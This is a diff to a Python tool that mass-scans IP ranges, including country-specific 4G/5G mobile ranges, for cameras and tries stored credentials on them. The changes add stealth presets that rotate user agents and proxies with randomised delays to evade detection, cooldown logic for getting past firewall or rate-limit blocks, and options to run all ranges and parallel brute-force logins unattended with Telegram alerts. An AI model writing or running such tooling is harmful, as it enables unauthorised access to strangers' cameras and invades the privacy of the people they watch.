-    firewalls / rate-limiters time to reset before the scan continues.
+    Threshold is intentionally high (default 97%) because broad IP scanning
+    produces naturally high 'error' rates — most IPs have no camera.  The cooldown
+    fires only when essentially every single attempt is failing, which signals a
+    genuine network-level block (firewall, rate-limit, or ISP null-route).
+
     Sends a Telegram alert both when the cooldown starts and when it ends."""
     rate = get_scan_error_rate()
     if rate >= threshold:
-        reduced = max(min_workers, current_workers // 2)
+        # No thread reduction — keep workers the same, just pause briefly
+        reduced = current_workers
         print(
-            f"\n{Fore.YELLOW}[!] Thread error rate {rate*100:.0f}% ≥ {threshold*100:.0f}%"
-            f" — cooling down {cooldown_sec}s, then threads {current_workers} → {reduced}"
+            f"\n{Fore.YELLOW}[!] Network failure rate {rate*100:.0f}% ≥ {threshold*100:.0f}%"
+            f" — possible rate-limit/block, cooling down {cooldown_sec}s (threads unchanged: {current_workers})"
             f"{Style.RESET_ALL}"
         )
 
@@ -15376,23 +15604,55 @@ def show_repeat_offenders() -> None:
 
 
 def toggle_stealth_mode() -> None:
-    """Toggle the anti-detection stealth mode on or off."""
-    global _stealth_mode, _STEALTH_MIN, _STEALTH_MAX
+    """Toggle anti-detection stealth mode with Low / Medium / High / Custom presets.
+    Any change is immediately saved to stealth_config.json and restored on next run."""
+    global _stealth_mode, _STEALTH_MIN, _STEALTH_MAX, _STEALTH_PRESET_NAME
     G, Y, W, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.CYAN
+
     _stealth_mode = not _stealth_mode
     if _stealth_mode:
-        print(f"\n{G}[✓] Stealth Mode ON{W} — random delays {_STEALTH_MIN:.2f}s–{_STEALTH_MAX:.2f}s, "
-              f"UA rotation, proxy rotation all active.")
+        # ── Preset selector ────────────────────────────────────────────────────
+        _STEALTH_PRESETS = {
+            '1': ('Low',    0.05, 0.20,  "Fast scan — minimal jitter, light fingerprint evasion"),
+            '2': ('Medium', 0.20, 0.60,  "Balanced — mimics slow human browsing patterns"),
+            '3': ('High',   0.80, 2.50,  "Paranoid — long random gaps, very hard to fingerprint"),
+            '4': ('Custom', None, None,  "Enter your own min/max delay values"),
+        }
+        print(f"\n{G}[✓] Stealth Mode{W} — choose a delay preset:\n")
+        for k, (pname, mn, mx, desc) in _STEALTH_PRESETS.items():
+            cur = f" {C}← current{W}" if pname == _STEALTH_PRESET_NAME else ""
+            if mn is not None:
+                print(f"  {C}[{k}]{W} {pname:<8}  {G}{mn:.2f}s – {mx:.2f}s{W}  {desc}{cur}")
+            else:
+                print(f"  {C}[{k}]{W} {pname:<8}  {desc}{cur}")
+        print()
         try:
-            _mn = float(input(f"{G}  Min delay (s) [{_STEALTH_MIN}]: {W}").strip() or _STEALTH_MIN)
-            _mx = float(input(f"{G}  Max delay (s) [{_STEALTH_MAX}]: {W}").strip() or _STEALTH_MAX)
-            _STEALTH_MIN = max(0.0, _mn)
-            _STEALTH_MAX = max(_STEALTH_MIN, _mx)
+            choice = input(f"  Select preset {C}[1-4]{W} (default=2 Medium): ").strip() or '2'
+            if choice in _STEALTH_PRESETS:
+                pname, mn, mx, _ = _STEALTH_PRESETS[choice]
+                if choice == '4':   # Custom
+                    _mn = float(input(f"  {G}Min delay (s) [{_STEALTH_MIN}]: {W}").strip() or _STEALTH_MIN)
+                    _mx = float(input(f"  {G}Max delay (s) [{_STEALTH_MAX}]: {W}").strip() or _STEALTH_MAX)
+                    _STEALTH_MIN = max(0.0, _mn)
+                    _STEALTH_MAX = max(_STEALTH_MIN, _mx)
+                    _STEALTH_PRESET_NAME = 'Custom'
+                else:
+                    _STEALTH_MIN, _STEALTH_MAX = mn, mx
+                    _STEALTH_PRESET_NAME = pname
+            else:
+                _STEALTH_MIN, _STEALTH_MAX = 0.20, 0.60
+                _STEALTH_PRESET_NAME = 'Medium'
         except Exception:
-            pass
-        print(f"  Delays: {_STEALTH_MIN:.2f}s – {_STEALTH_MAX:.2f}s")
+            _STEALTH_MIN, _STEALTH_MAX = 0.20, 0.60
+            _STEALTH_PRESET_NAME = 'Medium'
+        print(f"\n  {G}[✓] Stealth ON — {_STEALTH_PRESET_NAME} preset{W}  "
+              f"delays {_STEALTH_MIN:.2f}s – {_STEALTH_MAX:.2f}s  "
+              f"| UA rotation ON | proxy rotation ON")
     else:
-        print(f"\n{Y}[✓] Stealth Mode OFF{W} — normal speed resumed.")
+        print(f"\n{Y}[✓] Stealth Mode OFF{W} — settings kept, delays inactive.")
+    # ── Persist the new state so next run picks it up automatically ───────────
+    save_stealth_config()
+    print(f"  Saved to stealth_config.json ✓")
 
 
 # ── Tools Sub-menu Helpers ─────────────────────────────────────────────────────
@@ -16344,9 +16604,7 @@ def tools_submenu() -> None:
 
         # ── 14. Scan Mascot Demo ───────────────────────────────────────────────
         elif sub == '14':
-            for ev in ('idle', 'scanning', 'found', 'empty', 'error'):
-                mascot_react(ev, f"Event: {ev}")
-                time.sleep(0.5)
+            run_mascot_demo()
             if _tools_wait_back():
                 continue
 
@@ -16568,22 +16826,46 @@ def tools_submenu() -> None:
         # ── 23. 4G/5G Modem Camera Target Ranges ─────────────────────────────
         elif sub == '23':
             try:
+                import ipaddress as _ip23mod
                 print(f"  {Y}(blank=all countries, 'b'=back){W}")
                 _cc23 = input(f"{G}Country code: {W}").strip().upper()
                 if _cc23 == 'B':
                     continue
                 _ranges23 = list_mobile_camera_targets(_cc23)
                 if _ranges23:
-                    print(f"\n  {G}s.{W} Scan one of the ranges above")
+                    # Re-print numbered list for selection
+                    print()
+                    for _idx23, (_tcc23, _cidr23) in enumerate(_ranges23, 1):
+                        print(f"  {Y}{_idx23:>3}.{W} {_tcc23}  {_cidr23}")
+                    print(f"\n  {G}a.{W} Scan ALL ranges above sequentially")
+                    print(f"  {G}s.{W} Scan one specific range")
                     print(f"  {G}b.{W} Back to menu")
                     try:
-                        _act23 = input(f"{G}Action (s/b): {W}").strip().lower()
-                        if _act23 == 's':
-                            for _idx23, (_tcc23, _cidr23) in enumerate(_ranges23, 1):
-                                print(f"  {Y}{_idx23:>3}.{W} {_tcc23} {_cidr23}")
+                        _act23 = input(f"{G}Action (a/s/b): {W}").strip().lower()
+
+                        if _act23 == 'a':
+                            # ── Scan ALL ranges one by one ─────────────────────────────
+                            _creds23 = load_credentials()
+                            for _ridx23, (_tcc23, _cidr23) in enumerate(_ranges23, 1):
+                                if _stop_requested.is_set():
+                                    break
+                                try:
+                                    _net23 = _ip23mod.IPv4Network(_cidr23, strict=False)
+                                    _hs23  = list(_net23.hosts())
+                                    if not _hs23:
+                                        continue
+                                    _s23 = str(_hs23[0])
+                                    _e23 = str(_hs23[-1])
+                                    print(f"\n{C}[4G/5G Scan {_ridx23}/{len(_ranges23)}] "
+                                          f"{_tcc23} {_cidr23} → {_s23} – {_e23}{W}")
+                                    scan_ip_range(_s23, _e23, _creds23)
+                                except Exception as _e23err:
+                                    print(f"{R}[!] Skipped {_cidr23}: {_e23err}{W}")
+                            print(f"\n{G}[✓] All {len(_ranges23)} 4G/5G ranges scanned.{W}")
+
+                        elif _act23 == 's':
                             _cidx23 = input(f"{G}Select range number: {W}").strip()
                             try:
-                                import ipaddress as _ip23mod
                                 _sel23 = _ranges23[int(_cidx23) - 1][1]
                                 _net23 = _ip23mod.IPv4Network(_sel23, strict=False)
                                 _hs23  = list(_net23.hosts())
@@ -16624,9 +16906,8 @@ def tools_submenu() -> None:
 
         # ── 26. Random Cyber Fact ──────────────────────────────────────────────
         elif sub == '26':
-            show_random_fact()
-            if _tools_wait_back():
-                continue
+            show_random_fact(count=3)
+            continue
 
         # ── 27. Scan Mood Indicator ────────────────────────────────────────────
         elif sub == '27':
@@ -17001,6 +17282,7 @@ def main():
     _start_mem_monitor()
     load_proxies()
     load_geo_api_keys_from_config()
+    load_stealth_config()                 # restore stealth preset saved from last session
     load_stealth_config_from_telegram()
     show_random_fact()
 
@@ -27071,8 +27353,15 @@ if (CAMERAS.length > 0) {{
                          help='Auto-enable parallel login check (Option 2) with N concurrent '
                               'files — skips the interactive prompt; useful for headless / '
                               'scheduled runs.  N must be 1-8.  Example: --parallel-brute 3')
+    _parser.add_argument('--tg-fail-threshold', metavar='N', type=int, default=5,
+                         help='Telegram pool-health watchdog: force a session reset after N '
+                              'consecutive send-failures (default: 5, range: 1-50). '
+                              'Lower = faster recovery; higher = fewer resets on flaky networks.')
     # Parse only known args so nothing breaks if extra args are passed
     _args, _ = _parser.parse_known_args()
+    # Expose parsed args globally so other modules (e.g. Telegram worker) can read them
+    global _CLI_ARGS
+    _CLI_ARGS = _args
 
     # ── Apply --admin-account override ───────────────────────────────────────
     global _ADMIN_ACCOUNT_NAME
